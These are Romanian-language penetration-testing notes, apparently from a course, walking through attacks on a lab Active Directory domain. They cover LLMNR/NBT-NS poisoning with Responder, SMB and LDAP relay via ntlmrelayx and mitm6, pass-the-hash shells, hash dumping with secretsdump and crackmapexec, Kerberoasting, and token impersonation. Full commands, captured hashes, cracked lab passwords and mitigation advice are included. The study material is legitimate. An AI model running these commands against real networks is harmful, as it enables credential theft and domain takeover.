`NBT-NS`                        - Mecanism vechi de rezolvare a numelor (NetBIOS Name Service); poate fi ușor falsificat pentru a redirecționa traficul către un atacator și pentru a captura autentificări.


`WPAD`                          - Protocol pentru descoperirea automată a configurării proxy; poate fi exploatat dacă nu este configurat corect, permițând atacatorului să furnizeze un proxy malițios și să intercepteze traficul.

Vrei să continui și cu:

```bash
sudo responder -I tun0 -dwP
```
Dupa ce primim hash-ul o sa avem posibilitatea dea face brut la hash cu `hashcat` sau `john`:
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

Memul cu LLMR Poisoning:
![README-2025-11-20-13-12-02.png](../src/img/README-2025-11-20-13-12-02.png)


Attacul dat lucreaza in forma urmatoare:

![README-2025-11-20-11-05-47.png](../src/img/README-2025-11-20-11-05-47.png) 


### Capturing Hashes with Responder:

```bash
responder -I eth0 -dwv
```
Dupa aceasta utilizatorul aceseasa resursa gresita de genu `\\<IP_responder>` si primim hash-ul acestuia

```
[*] [DHCP] Found DHCP server IP: 172.16.49.254, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 172.16.49.145
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:68e9075bfd1a2253:1711F02FB7EEC04D0D1C79D77E75C4DD:010100000000000080C81BF93958DC01BCF43009E325FB3F00000000020008004D0034004F00330001001E00570049004E002D004E00460044003500580049005A00540048003600540004003400570049004E002D004E00460044003500580049005A0054004800360054002E004D0034004F0033002E004C004F00430041004C00030014004D0034004F0033002E004C004F00430041004C00050014004D0034004F0033002E004C004F00430041004C000700080080C81BF93958DC0106000400020000000800500050000000000000000100000000200000C8B8E417918D95A60079B84E45599682D06AD2ABD1BC3305E86DD55534C20515BF57E9B0E29ADEE6245AFDAB1992C94561BD476AC88355299BB27C88B7580F890A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E00340039002E003100340033000000000000000000
```

###  Cracking Our Captured Hashes:
```bash
hashcat -m 5600 hash.fcastle all.txt
```
Rezultatul trebuie sa arata in felul urmator:
```bash
FCASTLE::MARVEL:68e9075bfd1a2253:1711f02fb7eec04d0d1c79d77e75c4dd:010100000000000080c81bf93958dc01bcf43009e325fb3f00000000020008004d0034004f00330001001e00570049004e002d004e00460044003500580049005a00540048003600540004003400570049004e002d004e00460044003500580049005a0054004800360054002e004d0034004f0033002e004c004f00430041004c00030014004d0034004f0033002e004c004f00430041004c00050014004d0034004f0033002e004c004f00430041004c000700080080c81bf93958dc0106000400020000000800500050000000000000000100000000200000c8b8e417918d95a60079b84e45599682d06ad2abd1bc3305e86dd55534c20515bf57e9b0e29adee6245afdab1992c94561bd476ac88355299bb27c88b7580f890a001000000000000000000000000000000000000900240063006900660073002f003100370032002e00310036002e00340039002e003100340033000000000000000000:Password123456789
```

### LLMNR Poisoning Mitigation:

#### Cea mai eficientă metodă de protecție este dezactivarea LLMNR și NBT-NS.
Cum dezactivezi LLMNR:
În Group Policy, mergi la:

Local Computer Policy → Computer Configuration → Administrative Templates → Network → DNS Client și activezi opțiunea „Turn OFF Multicast Name Resolution”.

Cum dezactivezi NBT-NS:

Deschizi setările plăcii de rețea:

Network Connections → Proprietățile adaptorului → TCP/IPv4 → Advanced → WINS și selectezi „Disable NetBIOS over TCP/IP”.

Dacă organizația nu poate renunța la LLMNR / NBT-NS, atunci se recomandă:

Network Access Control (NAC):

Pentru a controla ce dispozitive au voie să se conecteze în rețea.

Parole puternice:

Parole lungi (ideal peste 14 caractere), complexe și care evită termeni comuni.Cu cât parola este mai solidă, cu atât este mai greu pentru un atacator să spargă hash-ul capturat.

Mitigarea atacurilor de tip LLMNR (Link-Local Multicast Name Resolution) și NBT-NS (NetBIOS Name Service)
 **Cea mai bună apărare este dezactivarea LLMNR și NBT-NS:**
1. **Dezactivarea LLMNR:**
    - Accesează:
        - _Local Computer Policy_ > _Computer Configuration_ > _Administrative Templates_ > _Network_ > _DNS Client_.
    - Selectează opțiunea: **"Turn OFF Multicast Name Resolution"**.
2. **Dezactivarea NBT-NS:**
    - Accesează:
        - _Network Connections_ > _Network Adapter Properties_ > _TCP/IPv4 Properties_ > _Advanced tab_ > _WINS tab_.
    - Selectează opțiunea: **"Disable NetBIOS over TCP/IP"**.
![README-2025-11-18-13-53-05.png](../src/img/README-2025-11-18-13-53-05.png)


Aceștea sunt pași care trebuie urmați pentru a micșora riscul acestui atac.


### SMB Relay Attacks:
`SMB`                           - Protocol de partajare a fișierelor și imprimantelor în rețele Windows; poate fi abuzat pentru atacuri precum SMB Relay dacă SMB signing nu este activat.

`SMB Relay`                     - În loc să spargem (crack-uim) hash-urile capturate cu Responder, putem redirecționa (relay) aceste hash-uri către anumite sisteme din rețea și, în unele cazuri, putem obține acces direct fără a cunoaște parola.

Requirements:
- SMB signing trebuie să fie dezactivat sau să nu fie impus (not enforced) pe țintă.
- Credentialele reluate (relayed user credentials) trebuie să fie de administrator pe mașina țintă pentru a avea valoare reală (pentru a putea executa acțiuni privilegiate).

Pentru a starta acest tip de attack trebuie sa configuram fisierul `nano /usr/share/responder/Responder.conf`

![README-2025-11-18-14-15-42.png](../src/img/README-2025-11-18-14-15-42.png)
Suntem interesati in 2 setari:
```
SMB = Off
HTTP = Off
```

Identify Hosts without SMB Signing:
```bash
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```
![README-2025-11-18-14-15-04.png](../src/img/README-2025-11-18-14-15-04.png)

Cu scripturile la `nmap` putem depista hosturile care nu semneaza `smb` si sa le scriem intrun fisier ca `target.txt`:

Instalam srcipturile `impacket-*`:
```bash
sudo apt install impacket-scripts
```

```bash
impacket-ntlmrelayx -tf target.txt -smb2support
impacket-ntlmrelayx -tf target.txt -smb2support -i # to get shell we can use -i si pe urma nc -lvnp <portul_care_este_returnat_de_ntlmrelayx>
impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami" # rulam de odata comanda dorita  
```
### SMB Relay Attacks Defenses:
1. Activează SMB Signing pe toate dispozitivele
- Pro: Blochează complet atacul
- Contra: Poate cauza probleme de performanță la transferurile de fișiere

2. Dezactivează autentificarea NTLM în rețea
- Pro: Blochează complet atacul
- Contra: Dacă Kerberos încetează să funcționeze, Windows revine automat la NTLM

3. Account tiering (separarea nivelurilor de conturi)

- Pro: Limitează accesul administratorilor de domeniu doar la anumite task-uri
(ex.: se loghează doar pe serverele care chiar necesită privilegii DA)
- Contra: Poate fi dificil de implementat și aplicat consecvent
 
4. Restricționarea administratorilor locali

- Pro: Poate preveni o mare parte din mișcarea laterală
- Contra: Poate crește numărul de tichete / probleme raportate la service desk

### Gaining Shell Access:
Sunt multe metode de-a primi un shell pe host o sa discutam despre `msfconsole` shell in cazul acesta:

Folosim modulul din msfconsole `windows/smb/psexec` setam optiunele pentru RHOST si altele pe urma `exploit`:
![README-2025-11-21-09-35-37.png](../src/img/README-2025-11-21-09-35-37.png)
Pentru a primi un shell pe hosturile noastre putem sa folosim si utilita `psexec.py` in felul urmator:
```bash
psexec.py marvel.local/fcastle:'Password1'@<IP_addresa>
```
![README-2025-11-21-09-38-27.png](../src/img/README-2025-11-21-09-38-27.png)

In utilitele date avem posibilitatea sa folosim nu doar `passwordul` dar putem sa folosim de odata si `hash`-ul pentru a ne loga si a primi un shell:
```bash
psexec.py administrator@<IP> -hashes LM:NT
```
![README-2025-11-21-09-41-13.png](../src/img/README-2025-11-21-09-41-13.png)

In modulele de `msfconsole` la fel avem posibilitatea sa folosim un hash in loc de parola directa:

![README-2025-11-20-15-31-15.png](../src/img/README-2025-11-20-15-31-15.png)

Mai avem un tool pentru a primi un shell pe host:
```bash
wmiexec.py administrator@<IP> -hashes LM:NT 
```

![README-2025-11-20-15-34-10.png](../src/img/README-2025-11-20-15-34-10.png)

Toolul dat la fel este pentru a generea un shell pe host `smbexec.py`:
```bash
smbexec.py administrator@<IP> -hashes LM:NT
```
![README-2025-11-20-15-34-36.png](../src/img/README-2025-11-20-15-34-36.png)
```bash

```

###  IPv6 Attacks Overview:
`LDAP Relay`        - Atac în care atacatorul folosește autentificarea NTLM primită de la o victimă și o retransmite (relay) către un server LDAP/LDAPS din Active Directory. Dacă signing nu este impus, atacatorul poate modifica atribute AD (ex. adăugare utilizatori la grupuri, schimbarea parolelor, delegări).

`Mitm6`             - Instrument de atac care exploatează preferința Windows pentru IPv6. Atacatorul creează un server IPv6 fals (rogue DHCPv6/DNS) și redirecționează traficul victimei. În combinație cu NTLM Relay, poate trimite autentificarea victimei către DC și obține acces privilegiat.


### IPv6 DNS Takeover via mitm6:
Install `mitm6`:
```bash
sudo pip2 install mitm6
# sau 
sudo apt install mitm6
```
Rularea tipului de attack relay:
```bash
impacket-ntlmrelayx -6 -t ldaps://172.16.49.144 -wh fakewpad.marve.local -l lootme 
...

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
...
```

Rulam si attackul de mitm pentru a prinde hash-urile:
```bash
sudo mitm6 -d marvel.local
...
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:46:c7:6a]
IPv4 address: 172.16.49.143
IPv6 address: fe80::75a2:c2dd:e312:bfa3
DNS local search domain: marvel.local
DNS allowlist: marvel.local
IPv6 address fe80::9991:1 is now assigned to mac=00:0c:29:5f:12:82 host=HYDRA-DC.MARVEL.local. ipv4=
IPv6 address fe80::9991:2 is now assigned to mac=00:0c:29:03:5f:85 host=SPIDERMAN.MARVEL.local. ipv4=
...
```
Dupa ce sunt setate toolurile date este nevoie sa facem un reboot la unul din useri. Dupa asta o sa putem vedea ceva de genul dat:
![README-2025-11-20-16-36-41.png](../src/img/README-2025-11-20-16-36-41.png)

`ntlmrelay` trebuie sa ne returneze ceva de genul dat:
![README-2025-11-20-16-47-59.png](../src/img/README-2025-11-20-16-47-59.png)

![README-2025-11-20-16-44-21.png](../src/img/README-2025-11-20-16-44-21.png)
Ideiea consta in aceea ca daca nu a fost nici o logare este posibil sa avem un account de honeypot 

### IPv6 Attack Defenses:
1. Blochează traficul IPv6 abuzat de mitm6 (dacă nu folosești IPv6 intern)

        Atacurile de tip IPv6 poisoning (ex: mitm6) profită de faptul că Windows face automat interogări IPv6 chiar și în rețele doar IPv4.
        Dacă organizația nu folosește IPv6, cea mai sigură metodă este:

        🔹 Blochează în firewall (prin GPO) următoarele tipuri de trafic:

            Inbound → DHCPv6
            Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)
            Inbound → Router Advertisement
            Core Networking – Router Advertisement (ICMPv6-In)
            Outbound → DHCPv6
            Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)

Acest lucru previne atacatorul să se prezinte ca DNS/DHCPv6 fals (ce face mitm6).

Dezactivarea completă a IPv6 poate crea efecte nedorite, de aceea blocarea traficului recomandat este preferată.

2. Dezactivează WPAD dacă nu este folosit

        Dacă organizația nu folosește WPAD:
        dezactivează-l prin Group Policy
        dezactivează serviciul WinHttpAutoProxySvc
        Asta previne atacuri în care un server WPAD fals redirecționează traficul victimei.

3. Blochează LDAP Relay

        Relay-ul către LDAP/LDAPS poate fi prevenit DOAR prin:
        activarea LDAP Signing
        activarea LDAP Channel Binding
        Fără aceste două setări → DC-ul poate accepta NTLM Relay.

4. Protejează conturile sensibile

        Pune utilizatorii administrativi în Protected Users
        SAU
        marchează conturile ca „Account is sensitive and cannot be delegated”

Asta previne impersonarea lor prin relay/delegare abuzivă.

### Passback Attacks:
A Pen Tester’s Guide to Printer Hacking - https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/

### Initial Internal Attack Strategy:
1. Begin the day with mitm6 or Responder

Start by running mitm6 or Responder to catch NTLM traffic early.
These tools work best when users start logging in and generating network activity.

2. Run scans to generate traffic

Perform network scans (Nmap, Masscan, etc.) to stimulate additional traffic.
More traffic = more chances to capture credentials or relay authentication.

3. If scans take too long, look for websites in scope

If scanning is slow, enumerate websites or web services quickly using something like:

        http_version
        lightweight web scanners
        banner grabbing
        Web services often reveal easy entry points.

4. Look for default credentials on web logins

Always check internal admin panels or devices for factory-default credentials:

        Printers
        Jenkins
        Cameras
        Switches / Routers
        Web dashboards
        Anything with a login page
        These are common and often overlooked.

5. Think outside the box

Be creative.
Try unusual attack paths, forgotten systems, weird ports, abandoned applications — internal networks often have many misconfigurations.

![README-2025-11-21-10-16-18.png](../src/img/README-2025-11-21-10-16-18.png)

## Attacking Active Directory: Post-Compromise Enumeration:
There are a few tools that offer quick and efficient enumeration:

        BloodHound
        PlumHound
        ldapdomaindump
        PingCastle
        And whatever else your heart desires
### Domain Enumeration with ldapdomaindump:

ldapdomaindump este un instrument folosit pentru:

        enumerarea obiectelor Active Directory
        extragerea informațiilor publice sau semi-publice din LDAP
        generarea unor rapoarte HTML/JSON cu toată structura domeniului

Nu exploatează nimic — folosește interogări LDAP legitime, exact cum o fac utilitarele Windows.
```bash
sudo ldapdomaindump ldaps://172.16.49.145 -u 'MARVEL\fcastle' -p Password1
```

### Domain Enumeration with Bloodhound:
Install bloodhound:
```bash
pip isntall bloodhound
#sau prin apt
sudo apt intall bloodhound
``` 
Rulam `neo4j` pentru baza de date:
```bash
sudo neo4j console
```
Dupa ce rulam o sa vedem o adresa locala unde trebuie sa ne logam:
```bash
#Credintialele by defoult
neo4j
neo4j #This was change in axis-mambo-sheriff-smart-couple-8019
```
Pe urma rulam singur `bloodhound`:
```bash
sudo bloodhound 
```
In cazul meu a fost necesar sa schimb si fisierul de configuratie:
```bash
sudo nano /etc/bhapi/bhapi.json #Aici schimbam credintialele
```
Credintialele pentru `bloodhound`:
```bash
admin
jR\GmSGB3=QVHr0w
```
Pentru a colecta datele ca ulterior acestea sa fie vizuabele rulam un colector:
```bash
sudo bloodhound-python -d MARVEL.local -u pparker -p Password1 -ns 172.16.49.144 -c all 
...
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: marvel.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hydra-dc.marvel.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SPIDERMAN.MARVEL.local
INFO: Querying computer: THEPANISHER.MARVEL.local
INFO: Querying computer: HYDRA-DC.MARVEL.local
INFO: Done in 00M 01S
```

### Domain enumeration with Plumhound:
[PlumHound](https://github.com/PlumHound/PlumHound) 
```bash
#install guide & use
git clone https://github.com/PlumHound/PlumHound
sudo pip3 install --break-system-packages  -r requirements.txt
#run plumhound
sudo python3 PlumHound.py --easy -p axis-mambo-sheriff-smart-couple-8019 
```
![README-2025-12-01-13-39-56.png](../src/img/README-2025-12-01-13-39-56.png)
```bash
sudo python3 PlumHound.py -x tasks/default.tasks -p "axis-mambo-sheriff-smart-couple-8019"
```
Dupa scanarea data o sa avem tot in fisierul `index.html` 
```bash
firefox index.html #si putem vede informatiea despre retea noastra
```

### Domain Enumeration with PingCastle:
[PingCastle](https://www.pingcastle.com/)
Un tool pentru reteau de domain controler si tot cei legat de accesta este instalat pe windows.


## Attacking Active Directory: Post-Compromise Attacks:

După ce ai intrat în sistem, ce poți face în continuare?

### Pass Attacks:
Dacă obținem parola în clar sau dump-ul de hash-uri din SAM, putem utiliza aceste informații pentru a accesa alte sisteme din rețea, facilitând mișcarea laterală.
```bash
crackmapexec smb 172.16.49.0/24 -u pparker -d MARVEL.local -p Password1 
```
![README-2025-12-01-14-11-22.png](../src/img/README-2025-12-01-14-11-22.png)
```bash
impacket-secretsdump MARVEL.local/pparker:Password1@172.16.49.146 #pe AC nu merge sa facem dump la fisierul (NTDS.DIT secrets) posibil pe el lucreaza antivirus
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-11-17 14:08:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:14337db340771011822d053b2c3d8a0ca3f92c0713f242931fb5af3d56878c6c
MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:b66a5a523ebb8afb4a9b6f98c4164c97
MARVEL\SPIDERMAN$:des-cbc-md5:20ef269dc8f1807c
MARVEL\SPIDERMAN$:plain_password_hex:5e00570066007100530070003b0041002a0034002f0043002e005a0071003d0066003c006000480053004800730028002d0021007700560046005f0046006d0046003d0054006100760066003e0053005f004f0046005a0074006c0049002300370037004d004d0036002a0024005f006200410078006f00770020006a004500770076004d006b005100200041002c00260041006e0065004400580059006c0063003c002f0030004400540048003b005c0049005600660043006f003900570039006d006e004d0042005b00390027003a003300700028006100240066003e0045003d0043003c00260071003e006f00
MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:dca2f030f367e01f8ae9720256eb2320:::
```
![README-2025-12-01-14-23-01.png](../src/img/README-2025-12-01-14-23-01.png)
```bash
crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth #run this ehen bottw machines is run to test 
```
![README-2025-12-01-14-29-08.png](../src/img/README-2025-12-01-14-29-08.png)


```bash
crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam 
...
MB         172.16.49.146   445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         172.16.49.146   445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.49.146   445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.49.146   445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
SMB         172.16.49.146   445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```
Credintialele pentru `frankcastle` - `frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`

```bash
crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```

```bash
crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

```bash
crackmapexec smb -L 
```

```bash
crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
```
![README-2025-12-01-15-34-58.png](../src/img/README-2025-12-01-15-34-58.png)

```bash
cmedb 
help 
creds

```
### Dumping and Cracking Hashes:
```bash
impacket-secretsdump MARVEL.local/pparker:'Password1'@172.16.49.146
```
![README-2025-12-01-16-13-22.png](../src/img/README-2025-12-01-16-13-22.png)
SAM hashes:
```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

```
`WDigest` - protocol vechi  

```bash
impacket-secretsdump Administrator:@172.16.49.145 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```
![README-2025-12-01-16-24-49.png](../src/img/README-2025-12-01-16-24-49.png)
```bash
llmnr -> fcastle hash -> cracked -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts
```
Crack the password:
```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -O 
```
###  Pass Attack Mitigations:
Pass the Hash / Pass the Password – Măsuri de Mitigare
Este dificil să prevenim complet aceste atacuri, dar putem face situația mult mai dificilă pentru un atacator prin:

🔹 Limitarea reutilizării conturilor:

        Evită reutilizarea aceleiași parole pentru conturile de administrator local
        Dezactivează conturile Guest și Administrator
        Limitează cine poate fi administrator local (principiul privilegiului minim)

🔹 Utilizarea de parole puternice:

        Cu cât sunt mai lungi, cu atât mai bine (ideal >14 caractere)
        Evită folosirea cuvintelor comune
        Frasele lungi sunt de preferat („I like long sentences”)

🔹 Privilege Access Management (PAM):

        Check-out/check-in pentru conturile sensibile doar când este necesar
        Rotirea automată a parolelor la check-out și check-in
        Reduce atacurile Pass-the-Hash / Pass-the-Password deoarece parolele și hash-urile sunt puternice și sunt rotate constant

### Kerberoasting:
![README-2025-12-02-10-30-18.png](../src/img/README-2025-12-02-10-30-18.png)

```bash
sudo impacket-GetUserSPNs  MARVEL.local/pparker:Password1 -dc-ip 172.16.49.144 -request
...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$e87a37398aebe158ab829eba9f3ac878$6a5a81d1c96f5dcdb56d22c50ad0c225868fdc58704ea5e0708a5ebda00559157dfa36986d01cfa171dd74e018f1b00599cd3f09fd376a0f7c3b9da42df49bc69e817a69940d1e619c83977847175277a7f6ea1aa5d8887acbe717aee077cb35333240ee11d79d42d81c202186bbfb31f3c1497a554b3bf52d5d663c1f80a826b46b35b20c21f0437993a1417f6d12151c6a85e0b94aff09d9ff4211069a3c4a7e03cd58b54890f6459df1cdbda49ef7763dde86546c4e5cda4d4bd297144beadb2790c2c17e4486f5c07bd18b8eef46a58c9583ba0c3d3e69a582b93ec9bd14c31dc192f2cfd5489921c0d0e9b33853fadc88370b9db12231c08c51e6f83c16e6d7d02d5a77084583b6ded00d8385c197b44b4422ee94c8d338ba8738c641bc219b658e9bc80ce04143294a83a4946f8cf25cfaaf7f72b89a05000bfe780535bf553b26059b92b7cc25eec423d2e6e1affb5ea8e7b626d8a0ecb5cf0ca77144fedf70f1913cf39b0e0852680691f9300547c91aa3ab7e1aefc2cd05b81e52ff67d7d784236db0a4c71e2322b030be69104e7669f5bf574106793758deec9f014818e507c4808b272f6a77d14611adf399a21dfd9585b9d7259353424330f7f0542629d4072a753d05cbd4b4bbc8df0ada32ddb003f2c5f4a0cb494bb21b0e06edb1bba1f4be4c7838ca346f2f6661555f69f78d8ce80ce520accdb78a38e55cf85f2cd1fe53746d938024416e138bdb2c51e9f04ad8cbb47d98da0f911bbae1731d3211afa932c917bb74421800de070280425de4cc5c9dc1a72772680706fcb655f94f20fbf71cc60128fab2ca114d31f5b7609f1c97e78372de73d33cdafa3ef07a205578891ed025f408ad4b9070c9e8d676c278bc378cb80cb137b904bc404153661129f3a5b90346ed8da5a2d8460f31c6002ad84cf0cd9f044e0c22a547f5794f7470bcc652e7898c42869dcf200014783c7fb7bd836c030ced8468fc8ea46f6b015598b487b010c0cb74d71cb83061e99537ec3159171579e3005d53d08f2b12c054a778a6fd11192c67f99719c83c7f424a95f8436d4e6ee8b5b04d8a1dd01136f011d0e6348081ccf3b073e4f30a3a1e7ed4f52d13135724e3b59d89eaef6f416f9485aeadcc07fcd612d1dfb6a68c7bdd229a7bc11ba55c0ccad3c9d8e8cd94988d3a89d5ffb563deb71a34816daf8d1fb1e1ba432622fd00007cd390d363518e723151ff5831068aea9d5ddf81ff1a44a78b48ffe883ee71f2b17baf0fe37215bb9627ca4b227566aa252e285951874bd4d990058d79f257217c768f1d967244883503edca5e0060ee5d9e79cab69656bf3263ee4a931a6244932f0b0303ae2db590c2b7f9823b7ca027752196b5b3655f67c060b227b8297470644b83996b359f5bc6f88616b29ef8b49bcb2afac183ccd0ef9d2f11
...
#then after this crack with hashcat 
hashcat -m 13100 kerberoast.txt rockyou.txt  
...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$e87a37398aebe158ab829eba9f3ac878$6a5a81d1c96f5dcdb56d22c50ad0c225868fdc58704ea5e0708a5ebda00559157dfa36986d01cfa171dd74e018f1b00599cd3f09fd376a0f7c3b9da42df49bc69e817a69940d1e619c83977847175277a7f6ea1aa5d8887acbe717aee077cb35333240ee11d79d42d81c202186bbfb31f3c1497a554b3bf52d5d663c1f80a826b46b35b20c21f0437993a1417f6d12151c6a85e0b94aff09d9ff4211069a3c4a7e03cd58b54890f6459df1cdbda49ef7763dde86546c4e5cda4d4bd297144beadb2790c2c17e4486f5c07bd18b8eef46a58c9583ba0c3d3e69a582b93ec9bd14c31dc192f2cfd5489921c0d0e9b33853fadc88370b9db12231c08c51e6f83c16e6d7d02d5a77084583b6ded00d8385c197b44b4422ee94c8d338ba8738c641bc219b658e9bc80ce04143294a83a4946f8cf25cfaaf7f72b89a05000bfe780535bf553b26059b92b7cc25eec423d2e6e1affb5ea8e7b626d8a0ecb5cf0ca77144fedf70f1913cf39b0e0852680691f9300547c91aa3ab7e1aefc2cd05b81e52ff67d7d784236db0a4c71e2322b030be69104e7669f5bf574106793758deec9f014818e507c4808b272f6a77d14611adf399a21dfd9585b9d7259353424330f7f0542629d4072a753d05cbd4b4bbc8df0ada32ddb003f2c5f4a0cb494bb21b0e06edb1bba1f4be4c7838ca346f2f6661555f69f78d8ce80ce520accdb78a38e55cf85f2cd1fe53746d938024416e138bdb2c51e9f04ad8cbb47d98da0f911bbae1731d3211afa932c917bb74421800de070280425de4cc5c9dc1a72772680706fcb655f94f20fbf71cc60128fab2ca114d31f5b7609f1c97e78372de73d33cdafa3ef07a205578891ed025f408ad4b9070c9e8d676c278bc378cb80cb137b904bc404153661129f3a5b90346ed8da5a2d8460f31c6002ad84cf0cd9f044e0c22a547f5794f7470bcc652e7898c42869dcf200014783c7fb7bd836c030ced8468fc8ea46f6b015598b487b010c0cb74d71cb83061e99537ec3159171579e3005d53d08f2b12c054a778a6fd11192c67f99719c83c7f424a95f8436d4e6ee8b5b04d8a1dd01136f011d0e6348081ccf3b073e4f30a3a1e7ed4f52d13135724e3b59d89eaef6f416f9485aeadcc07fcd612d1dfb6a68c7bdd229a7bc11ba55c0ccad3c9d8e8cd94988d3a89d5ffb563deb71a34816daf8d1fb1e1ba432622fd00007cd390d363518e723151ff5831068aea9d5ddf81ff1a44a78b48ffe883ee71f2b17baf0fe37215bb9627ca4b227566aa252e285951874bd4d990058d79f257217c768f1d967244883503edca5e0060ee5d9e79cab69656bf3263ee4a931a6244932f0b0303ae2db590c2b7f9823b7ca027752196b5b3655f67c060b227b8297470644b83996b359f5bc6f88616b29ef8b49bcb2afac183ccd0ef9d2f11:MYpassword123#
...
```
Dupa asta vedem si parola pentru serviciul nostru 
### Mitigation Strategies:
- Strong Passwords 
- Least privilege 

### Token Impersonation Overview:
Ce sunt token-urile?
• Chei temporare care îți permit accesul la un sistem/rețea fără să introduci credențialele de fiecare dată când accesezi un fișier. Gândește-le ca pe niște „cookies” pentru computere.

Două tipuri:
• Delegate – Create pentru logarea într-o mașină sau folosirea Remote Desktop
• Impersonate – „non-interactiv”, cum ar fi atașarea unui drive de rețea sau un script de logare în domeniu
Exemplu:
Afișează cu ce utilizator rulezi în sesiunea Meterpreter.
```bash
meterpreter > getuid
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
...
Delegation Tokens Available
===============================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
===============================================
No tokens available
...
